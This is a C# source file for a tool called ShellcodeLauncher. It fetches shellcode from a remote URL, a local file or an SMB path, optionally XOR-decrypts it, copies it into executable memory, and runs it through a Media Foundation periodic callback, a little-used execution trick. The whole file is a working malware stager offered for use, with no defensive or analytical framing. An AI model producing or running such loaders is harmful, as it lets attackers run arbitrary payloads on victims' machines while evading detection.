using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace ShellcodeLauncher
{
    class Program
    {
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        public delegate void MFPERIODICCALLBACK(IntPtr arg);

        // Stub for the MF functions
        [DllImport("Mfplat.dll")]
        public static extern int MFStartup(uint Version, uint dwFlags);

        [DllImport("Mfplat.dll")]
        public static extern int MFShutdown();

        [DllImport("Mfplat.dll")]
        public static extern int MFAddPeriodicCallback(MFPERIODICCALLBACK Callback, IntPtr pContext, out uint pdwKey);



        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: ShellcodeLauncher.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
                return;
            }

            string sourcePath = args[1];
            string xorKey = null;

            if (args.Length == 4 && args[2] == "-k")
            {
                xorKey = args[3];
            }

            byte[] shellcode;

            if (args[0] == "-r")
            {
                shellcode = DownloadShellcodeFromUrl(sourcePath);
            }
            else
            {
                shellcode = File.ReadAllBytes(sourcePath);
            }

            if (!string.IsNullOrEmpty(xorKey))
            {
                shellcode = DecryptShellcode(shellcode, xorKey);
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
                return;
            }

            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (hAlloc == IntPtr.Zero)
            {
                Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
                return;
            }
            else
            {
                Console.WriteLine($"[Success] Memory allocation for shellcode was successful at address: {hAlloc}");
            }

            Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

            MFStartup(0x00070, 0);
            int result = MFAddPeriodicCallback((MFPERIODICCALLBACK)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(MFPERIODICCALLBACK)), IntPtr.Zero, out uint _);

            if (result == 0) // 0 indicates S_OK in HRESULT values, which means successful execution
            {
                Console.WriteLine("[Success] MFAddPeriodicCallback method invoked successfully.");
            }
            else
            {
                Console.WriteLine($"[Failed] MFAddPeriodicCallback method failed with error code: {result}");
            }

            System.Threading.Thread.Sleep(10000);

            MFShutdown();

            VirtualFree(hAlloc, 0, 0x8000);

        }

        static byte[] DownloadShellcodeFromUrl(string url)
        {
            using (var httpClient = new HttpClient())
            {
                try
                {
                    var byteArray = httpClient.GetByteArrayAsync(url).Result;
                    if (byteArray != null && byteArray.Length > 0)
                    {
                        Console.WriteLine("[Success] Shellcode downloaded successfully.");
                        return byteArray;
                    }
                    else
                    {
                        Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                        return null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                    return null;
                }
            }
        }

        static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
        {
            byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
            }
            return decryptedShellcode;
        }
    }
}
